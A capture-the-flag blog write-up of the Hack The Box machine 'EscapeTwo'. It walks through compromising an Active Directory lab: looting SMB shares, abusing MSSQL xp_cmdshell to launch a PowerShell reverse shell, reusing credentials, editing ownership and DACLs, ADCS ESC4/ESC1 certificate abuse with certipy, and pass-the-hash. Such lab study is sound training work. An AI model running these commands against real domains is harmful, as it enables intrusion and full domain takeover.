---
layout: post
title: "EscapeTwo"
date: 2025-05-24
categories: [htb, easy]
provider: htb
machine: escapetwo
---

I think someone made a mistake. EscapeTwo was an easy-rated box, while [Administrator](administrator) was deemed medium, and to me they were clearly the other way around. That aside, this was an example of a box where I needed to act with practically no knowledge of the issue at hand. Some subjects are so narrow that they can mostly be learned then and there, but that was not the case here. Luckily, a cool little tool took my hand.

I'm making myself nervous teasing the content without saying anything concrete, so let's just dive in.

## Electric Light Orchestra "Mr Blue Light" on
This is another "assumed breach" scenario, so \[hacker voice\] _we're in_. We asked `Nmap` _where_ we're in, and found out we're in a regular everyday normal Active Directory domain controller, with the exception of an open MSSQL port.

Before moving further I let my trusty BloodHound sniff around, after he'd practically solved the Administrator box on its own.
```
$ sudo bloodhound-python -u 'rose' -p 'KxEPkKe6R8su' -ns 10.10.11.51 -d sequel.htb -c all --zip
INFO: Found AD domain: sequel.htb
<SNIP>
INFO: Compressing output into 20250409171202_bloodhound.zip
```

Aside from the fact that we're apparently hacking into The Office, looking at the usernames, my trusty hound doesn't tell me much this time. Only that Ryan will probably be causing trouble later on, with `WriteOwner` rights over a service account.

Checking the database, only the default system databases seem to exist, and Rose cannot execute system commands or even trigger an authentication request to a fake SMB server:
```
$ impacket-mssqlclient rose@10.10.11.51 -windows-auth
<SNIP>

SQL (SEQUEL\rose  guest@master)> SELECT name FROM master.dbo.sysdatabases
name     
------   
master
tempdb
model
msdb

SQL (SEQUEL\rose  guest@master)> enable_xp_cmdshell
ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.

SQL (SEQUEL\rose  guest@msdb)> xp_subdirs '\\10.10.14.75\share\'
ERROR(DC01\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_subdirs', database 'mssqlsystemresource', schema 'sys'.
```

I tried a spray of Rose's password on the other users, with no effect. Two service accounts have SPNs so I tried to Kerberoast them, but `hashcat` was not able to crack the hashes. So I turned my attention to shares, and Rose has access to a few:
```
$ netexec smb 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su' --shares                                               
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ            
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.11.51     445    DC01             Users           READ
```

The `Accounting Department` share has a couple of files we can check for sensitive data:
```
$ smbclient -U "rose" "\\\\10.10.11.51\\Accounting Department"                                               
Password for [WORKGROUP\rose]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jun  9 12:52:21 2024
  ..                                  D        0  Sun Jun  9 12:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 12:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 12:52:07 2024

                6367231 blocks of size 4096. 895872 blocks available
smb: \> get accounting_2024.xlsx 
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (109.6 KiloBytes/sec) (average 109.6 KiloBytes/sec)
smb: \> get accounts.xlsx 
getting file \accounts.xlsx of size 6780 as accounts.xlsx (72.8 KiloBytes/sec) (average 91.2 KiloBytes/sec)
```

## Where's Dwight?
LibreOffice was somehow not able to open the files properly, and with `file` telling me they were essentially ZIP files, I unpacked them. This generates a mess of XML files... After some manual checking looked like a waste of time, I started `grep`ping for interesting things. If that hadn't worked I would have spent time figuring out why LibreOffice wasn't reading these, but that's not how I like to spend my time on these boxes. Luckily `grep` did find something. The snippet below is heavily edited, because I assume you don't want to read a ton of useless XML:
```
$ grep -ri "pass" *
accounts/xl/sharedStrings.xml:
Email              Password
angela@sequel.htb  0fwz7Q4mSpurIt99
oscar@sequel.htb   <REDACTED>
kevin@sequel.htb   Md9Wlq1E5bZnVDVo
sa@sequel.htb      <REDACTED>
```

More Dunder Mifflin employees! I ran some quick checks to see if Oscar gave us something new, but didn't spend too much time there because the `sa` user would probably give us command execution on the machine:
```
$ impacket-mssqlclient sa@10.10.11.51
<SNIP>

SQL (sa  dbo@master)> enable_xp_cmdshell
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL (sa  dbo@master)> xp_cmdshell whoami
output           
--------------   
sequel\sql_svc
```

In this situation, I usually go to [revshells.com](https://www.revshells.com/) for a base64-encoded PowerShell reverse shell:
```
SQL (sa  dbo@master)> xp_cmdshell powershell -e JABjAGwAa<SNIP>ApAA==
```

Now, \[hacker voice\] _we're **really** in_:
```
$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.75] from (UNKNOWN) [10.10.11.51] 59840

whoami
sequel\sql_svc

PS C:\Windows\system32>  
```

Sadly this is not giving us our user flag yet, but indeed Ryan might be the one:
```
PS C:\Users> dir

d-----       12/25/2024   3:10 AM                Administrator
d-r---         6/9/2024   4:11 AM                Public
d-----         4/9/2025   8:57 AM                ryan
d-----         4/9/2025   2:52 AM                sql_svc
```

Enumeration started, first with things like privileges and groups which didn't give us much, and then with a credential hunt, which found a needle in a haystack:
```
PS C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
<SNIP>
SQL2019\ExpressAdv_ENU\sql-Configuration.INI
<SNIP>

PS C:\> type SQL2019\ExpressAdv_ENU\sql-Configuration.INI
<SNIP>
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="<REDACTED>"
<SNIP>
```

This looked useful in case we found a way to connect to the machine without going through the `xp_cmdshell` dance again, but I left it there, ignoring one of the earliest lessons I had learned... I kept looking for stuff in the database, in the files, looking for connected databases, powershell history, scheduled tasks, installed software, even winpeas... and it was only when I stumbled upon that SQL configuration file again that I wondered... _ughh_, is Ryan the database admin, is he reusing the password?
```
$ netexec smb 10.10.11.51 -u 'ryan' -p '<REDACTED>'

SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\ryan:<REDACTED>

$ evil-winrm -i 10.10.11.51 -u ryan -p '<REDACTED>'

<SNIP>
*Evil-WinRM* PS C:\Users\ryan\Documents>  
```

## Ryan started the fire!
Looking at BloodHound again, after a restart to make sure I was not being cheesed by other players, Ryan indeed has `WriteOwner` rights over the `ca_svc` account. This will allow us to gain full control of the account, after assigning one of our controlled users to be the owner. The name of the account, and its membership in the `Cert Publishers` group, indicated that it is involved in Certificate Authority shenanigans. I didn't know much about this, so I tried to read up on it before going further, to try to have a clear path in my mind. 

It turns out that the attack surface is vast, so I still don't know much about this and ended up just scratching the surface. I found great articles (like [this one](https://decoder.cloud/2023/11/20/a-deep-dive-in-cert-publishers-group/), this [two](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/)-[part](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-2/) series, and especially the [seminal work](https://posts.specterops.io/certified-pre-owned-d95910965cd2) on the subject), but I was clearly not going to be able to skim for a solution to the task at hand, since I don't even know what I don't know. At this point I might as well spend time properly building the knowledge, like following the Academy's module on [ADCS attacks](https://academy.hackthebox.com/course/preview/adcs-attacks).

However, a tool called [certipy](https://github.com/ly4k/Certipy) kept coming up during research, and from what I could tell it would be able to [find](https://github.com/ly4k/Certipy/tree/4.8.2?tab=readme-ov-file#find) the specific vulnerabilities I would need to understand to solve this box. So I decided to let it guide me into this new world.

Note: there are several tools with this name (and `apt` suggests the wrong one), so `certipy-ad` in the Python Package Index is the one we need:
```
$ pipx install certipy-ad
```

Another note: after a couple of years of inactivity, the project _just_ released (at the time of writing) [a new version 5](https://github.com/ly4k/Certipy/discussions/270). I had solved the box and documented it with the then-latest version 4.8.2, and have not re-tested the commands for this write-up, so your mileage may vary.

Notes aside, lets get back into it. Using `certipy` with Ryan's account didn't give us anything unfortunately:
```
$ certipy find -u 'ryan@sequel.htb' -p '<REDACTED>' -dc-ip '10.10.11.51' -vulnerable -stdout

<SNIP>
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
<SNIP>
[*] Got CA configuration for 'sequel-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
<SNIP>
Certificate Templates                   : [!] Could not find any certificate templates
```

I assumed this was due to that `E_ACCESSDENIED` error, so lets own that `ca_svc` account first. There seems to be a clean-up script in place here, so these steps all the way through generating certificates need to be done relatively quickly. Command-line history to the rescue. I can't imagine playing this during its first week, it must have been chaos with players stepping on each other's toes. Anyway, following BloodHound's instructions we'll use Impacket to take ownership of the user account and give ourselves full rights over it:
```
$ impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'<REDACTED>'

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!

$ impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'<REDACTED>'

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250410-100137.bak
[*] DACL modified successfully!
```

With full rights, we can change the account's password, and confirm it for good measure:
```
$ net rpc password "ca_svc" "tmantmantman" -U "sequel.htb"/"ryan"%"<REDACTED>" -S "dc01.sequel.htb"

$ netexec smb sequel.htb -u 'ca_svc' -p 'tmantmantman'

SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\ca_svc:tmantmantman
```

Now `certipy`  does tell us a bit more, despite that `E_ACCESSDENIED` error still popping up, so that's not really what that was but it doesn't seem to matter. A certificate template is now found, and has vulnerable permissions that may allow for domain privilege escalation:
```
$ certipy find -u 'ca_svc@sequel.htb' -p 'tmantmantman' -dc-ip '10.10.11.51' -vulnerable -stdout             

<SNIP>
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
<SNIP>
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
<SNIP>
	Permissions
	  Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
```

The security researchers who reported these coined each escalation method with `ESC` followed by a number, and we can read more about them in the ["Certify Pre-owned"](https://posts.specterops.io/certified-pre-owned-d95910965cd2) article I had already linked above. `certipy` is reporting that this template is vulnerable to [ESC4](https://github.com/ly4k/Certipy/tree/4.8.2?tab=readme-ov-file#esc4), which essentially means that we can write to the certificate template. With this, we can change the template to be vulnerable to _other_ domain escalation methods, like `ESC1`.

`certipy`'s  default behaviour, when using the `template` option without specifying a specific configuration to write with the `-configuration` flag, is precisely to make the template vulnerable to `ESC1`, so we do that:
```
$ certipy template -username ca_svc@sequel.htb -password tmantmantman -template DunderMifflinAuthentication -save-old
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Saved old configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
```

Now we can abuse [ESC1](https://github.com/ly4k/Certipy/tree/4.8.2?tab=readme-ov-file#esc1). This is when a certificate allows client authentication, and allows the requester to set an arbitrary Subject Alternative Name. In other words, if the certificate allows it, we can request a certificate for authentication, and we can request to authenticate as any given user. Like, I don't know, a domain admin for example. So we do just that, with the `req` option to request a certificate, and the `-upn` flag specifying the admin account we're interested in:
```
$ certipy req -username ca_svc@sequel.htb -password tmantmantman -ca sequel-DC01-CA -target 10.10.11.51 -template DunderMifflinAuthentication -upn administrator@sequel.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 13
[*] Got certificate with UPN 'administrator@sequel.htb' 
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Note that attempting this with `-target sequel.htb`  failed with a `CERTSRV_E_SUBJECT_DNS_REQUIRED` error, but using the IP worked, regardless of what [this note on HackTricks](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc1-template-allows-san) says. ¯\\_(ツ)_/¯.

Now we can authenticate using `certipy`'s `auth` option and the generated PFX file, which provides us with the Administrator's hash. We promptly pass that hash to complete the box:
```
$ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.51

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': a<REDACTED>e:7<REDACTED>f 

$ evil-winrm -i 10.10.11.51 -u Administrator -H '7<REDACTED>f'

<SNIP>
*Evil-WinRM* PS C:\Users\Administrator\Documents>  
```

## Roll the credits
- Can't believe I'm writing this as a lesson learned, but I often underestimate credential reuse.
- This was my first venture into abusing ADCS, but I shortcut the learning to solve the box. That Academy module is on the list.
- This episode didn't feature Dwight, and yet it was highly entertaining.
- As always, for reading this far, you're a champ.